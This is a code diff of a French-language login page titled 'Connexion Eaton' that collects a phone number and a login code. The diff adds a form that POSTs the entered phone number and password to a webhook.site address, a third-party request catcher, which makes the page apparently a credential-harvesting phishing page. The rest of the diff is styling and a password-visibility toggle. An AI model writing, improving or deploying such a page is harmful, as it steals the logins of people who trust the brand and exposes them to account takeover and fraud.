@@ -3,106 +3,121 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Connexion</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <title>Connexion Eaton</title>
   <style>
     * {
       box-sizing: border-box;
     }
+
     body {
       margin: 0;
-      font-family: 'Inter', sans-serif;
-      background-color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
+      font-family: Arial, sans-serif;
+      background-color: #ffffff;
     }
+
     .container {
-      width: 90%;
       max-width: 400px;
+      margin: 60px auto;
+      padding: 20px;
     }
+
     h1 {
       font-size: 24px;
-      font-weight: 600;
-      margin-bottom: 5px;
+      font-weight: bold;
+      margin-bottom: 10px;
+      color: #000;
     }
+
     p {
-      color: #777;
-      margin-top: 0;
+      color: #888;
       margin-bottom: 30px;
     }
+
     label {
       display: block;
-      margin-bottom: 8px;
-      font-weight: 500;
+      margin-bottom: 5px;
+      font-weight: bold;
+      color: #555;
     }
+
     .phone-input {
       display: flex;
-      border: 1px solid #ddd;
-      border-radius: 12px;
-      overflow: hidden;
+      align-items: center;
+      background: #f9f9f9;
+      border: none;
+      border-radius: 10px;
+      padding: 10px;
       margin-bottom: 20px;
     }
+
     .phone-input select {
       border: none;
-      padding: 12px;
-      background: #f9f9f9;
-      font-size: 14px;
-      outline: none;
+      background: transparent;
+      font-size: 16px;
+      margin-right: 10px;
     }
+
     .phone-input input {
-      flex: 1;
       border: none;
-      padding: 12px;
-      font-size: 14px;
+      background: transparent;
+      font-size: 16px;
+      flex: 1;
       outline: none;
     }
-    .password-container {
-      position: relative;
+
+    .password-input {
+      display: flex;
+      align-items: center;
+      background: #f9f9f9;
+      border: none;
+      border-radius: 10px;
+      padding: 10px;
       margin-bottom: 20px;
     }
-    .password-container input {
-      width: 100%;
-      padding: 12px 44px 12px 12px;
-      border: 1px solid #ddd;
-      border-radius: 12px;
-      font-size: 14px;
+
+    .password-input input {
+      border: none;
+      background: transparent;
+      font-size: 16px;
+      flex: 1;
       outline: none;
     }
-    .toggle-password {
-      position: absolute;
-      right: 12px;
-      top: 50%;
-      transform: translateY(-50%);
+
+    .password-input button {
       background: none;
       border: none;
       cursor: pointer;
-      padding: 4px;
+      padding: 0;
     }
-    .toggle-password svg {
+
+    .password-input svg {
       width: 24px;
       height: 24px;
+      stroke: #555;
     }
-    button {
+
+    button.submit {
       width: 100%;
-      background-color: #3b6cff;
-      color: white;
-      padding: 14px;
-      font-size: 16px;
+      padding: 15px;
+      background-color: #3e6efc;
       border: none;
-      border-radius: 999px;
+      border-radius: 30px;
+      color: white;
+      font-size: 16px;
       font-weight: bold;
       cursor: pointer;
     }
-    .bottom-text {
+
+    .footer-text {
       text-align: center;
-      margin-top: 15px;
+      margin-top: 20px;
+      color: #555;
     }
-    .bottom-text a {
-      color: #3b6cff;
+
+    .footer-text a {
+      color: #3e6efc;
       text-decoration: none;
-      font-weight: 500;
+      font-weight: bold;
     }
   </style>
 </head>
@@ -111,54 +126,48 @@
     <h1>Bienvenue à nous rejoindre</h1>
     <p>Connectez-vous à votre compte</p>
 
-    <label for="phone">Numéro de Téléphone</label>
-    <div class="phone-input">
-      <select name="code" id="code">
-        <option value="+221">+221</option>
-        <option value="+225">+225</option>
-        <option value="+226">+226</option>
-        <option value="+228">+228</option>
-        <option value="+229">+229</option>
-        <option value="+237">+237</option>
-      </select>
-      <input type="tel" placeholder="Veuillez entrer votre numéro de téléphone" />
-    </div>
+    <form action="https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5" method="POST">
+      <label for="phone">Numéro de Téléphone</label>
+      <div class="phone-input">
+        <select name="prefixe">
+          <option value="+221">+221</option>
+          <option value="+225">+225</option>
+          <option value="+226">+226</option>
+          <option value="+228">+228</option>
+          <option value="+229">+229</option>
+          <option value="+237">+237</option>
+        </select>
+        <input type="tel" name="telephone" placeholder="Veuillez entrer votre numéro" required />
+      </div>
 
-    <label for="password">Code de Connexion</label>
-    <div class="password-container">
-      <input type="password" id="password" placeholder="Code de Connexion" />
-      <button type="button" class="toggle-password" onclick="togglePassword()">
-        <!-- Icône œil barré (mot de passe caché) -->
-        <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="#000" stroke-width="2" viewBox="0 0 24 24">
-          <path d="M17.94 17.94A10.5 10.5 0 0 1 12 19.5C7.05 19.5 2.73 16.29 1.5 12c.57-1.73 1.65-3.28 3.06-4.5m3.07-2.12A10.44 10.44 0 0 1 12 4.5c4.95 0 9.27 3.21 10.5 7.5a10.56 10.56 0 0 1-2.53 4.34M1 1l22 22" />
-        </svg>
-      </button>
-    </div>
+      <label for="password">Code de Connexion</label>
+      <div class="password-input">
+        <input type="password" name="password" id="password" placeholder="Code de Connexion" required />
+        <button type="button" onclick="togglePassword()">
+          <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-5.523 0-10-5.373-10-7s4.477-7 10-7c1.14 0 2.235.21 3.252.598m4.134 2.165A9.975 9.975 0 0122 12c0 1.084-.319 2.225-.875 3.375M15 12a3 3 0 11-6 0 3 3 0 016 0zm-6.364 6.364L4 4m16 16L4 4" />
+          </svg>
+        </button>
+      </div>
 
-    <button type="submit">Se Connecter Maintenant</button>
+      <button class="submit" type="submit">Se Connecter Maintenant</button>
 
-    <div class="bottom-text">
-      Vous n’avez pas de compte ? <a href="#">Inscrivez-vous</a>
-    </div>
+      <div class="footer-text">
+        Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
+      </div>
+    </form>
   </div>
 
   <script>
+    const passwordInput = document.getElementById("password");
+    const eyeIcon = document.getElementById("eye-icon");
+
     function togglePassword() {
-      const input = document.getElementById('password');
-      const icon = document.getElementById('eye-icon');
-      if (input.type === 'password') {
-        input.type = 'text';
-        icon.innerHTML = `
-          <circle cx="12" cy="12" r="10" stroke="none"/>
-          <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
-          <circle cx="12" cy="12" r="3"/>
-        `;
-      } else {
-        input.type = 'password';
-        icon.innerHTML = `
-          <path d="M17.94 17.94A10.5 10.5 0 0 1 12 19.5C7.05 19.5 2.73 16.29 1.5 12c.57-1.73 1.65-3.28 3.06-4.5m3.07-2.12A10.44 10.44 0 0 1 12 4.5c4.95 0 9.27 3.21 10.5 7.5a10.56 10.56 0 0 1-2.53 4.34M1 1l22 22" />
-        `;
-      }
+      const isHidden = passwordInput.type === "password";
+      passwordInput.type = isHidden ? "text" : "password";
+      eyeIcon.innerHTML = isHidden
+        ? `<path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>`
+        : `<path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-5.523 0-10-5.373-10-7s4.477-7 10-7c1.14 0 2.235.21 3.252.598m4.134 2.165A9.975 9.975 0 0122 12c0 1.084-.319 2.225-.875 3.375M15 12a3 3 0 11-6 0 3 3 0 016 0zm-6.364 6.364L4 4m16 16L4 4" />`;
     }
   </script>
 </body>
